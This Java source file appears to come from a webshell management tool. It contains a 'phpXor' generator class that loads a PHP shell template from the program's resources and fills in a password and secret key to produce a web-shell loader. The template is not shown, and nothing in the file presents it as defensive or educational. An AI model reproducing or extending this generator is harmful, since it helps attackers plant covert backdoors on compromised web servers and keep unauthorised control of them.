package shells.cryptions.phpXor;

import java.io.InputStream;
import util.Log;
import util.functions;

class Generate {
    Generate() {
    }

    public static byte[] GenerateShellLoder(String pass, String secretKey, boolean isBin) {
        try {
            InputStream inputStream = Generate.class.getClassLoader().getResourceAsStream("shell/php/template/" + (isBin ? "raw.bin" : "base64.bin"));
            String code = new String(functions.readInputStream(inputStream));
            inputStream.close();
            return code.replace("{pass}", pass).replace("{secretKey}", secretKey).getBytes();
        } catch (Exception e) {
            Log.error(e);
            return null;
        }
    }

    public static void main(String[] args) {
        System.out.println(new String(GenerateShellLoder("123", "456", true)));
    }
}
